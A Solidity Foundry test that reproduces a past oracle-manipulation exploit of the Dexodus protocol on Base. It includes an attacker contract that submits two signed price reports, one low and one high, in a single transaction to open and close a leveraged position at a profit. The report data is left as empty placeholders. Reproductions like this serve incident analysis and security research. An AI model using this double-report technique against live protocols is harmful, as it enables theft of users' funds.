pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost: ~300K USD
// Attacker: https://basescan.org/address/0x863d3b920a6d98d5689d2cb8bb0d61e90a91e0dc
// Attack Tx: https://basescan.org/tx/0x6ffb494293fc5c32c5a6ab7dc3fff1fcc6e90fba9a6d6e486ba0a15ce518147e
// Vulnerable Contract: https://basescan.org/address/0x39016479a05626df9ba4cb80864e1b3b69d694b4
//
// Dexodus accepted two valid signed reports carrying sharply different ETH
// prices in one transaction. The attacker opened a leveraged long at the low
// report price and immediately closed it at the high report price.

interface IDexodusOracleKeeper {
    function performUpkeep(
        bytes calldata report
    ) external;
}

contract DexodusAttacker {
    IDexodusOracleKeeper private constant ORACLE_KEEPER =
        IDexodusOracleKeeper(0xF6Aad394eD38D860bd2f3Cc142D7eB5BbBBBA169);

    function attack(
        bytes calldata lowPriceReport,
        bytes calldata highPriceReport
    ) external {
        // Each report includes the signed beneficiary and the complete
        // modifyPosition request, so any caller can submit both operations.
        ORACLE_KEEPER.performUpkeep(lowPriceReport);
        ORACLE_KEEPER.performUpkeep(highPriceReport);
    }
}

contract DexodusExploitTest is Test {
    IERC20 private constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    address private constant SIGNED_BENEFICIARY = 0x863D3B920a6D98D5689D2cB8Bb0D61E90a91e0dc;
    uint256 private constant FORK_BLOCK = 30_737_029;

    function setUp() public {
        vm.createSelectFork("https://base-mainnet.public.blastapi.io", FORK_BLOCK);
    }

    function testExploit() public {
        DexodusAttacker attacker = new DexodusAttacker();
        deal(address(USDC), SIGNED_BENEFICIARY, 10_500e6);
        uint256 balanceBefore = USDC.balanceOf(SIGNED_BENEFICIARY);

        (bytes memory lowPriceReport, bytes memory highPriceReport) = _reports();
        attacker.attack(lowPriceReport, highPriceReport);

        uint256 profit = USDC.balanceOf(SIGNED_BENEFICIARY) - balanceBefore;
        emit log_named_decimal_uint("USDC profit", profit, 6);
        assertGt(profit, 290_000e6);
    }

    function _reports() private pure returns (bytes memory lowPriceReport, bytes memory highPriceReport) {
        lowPriceReport = hex"";
        highPriceReport = hex"";
    }
}
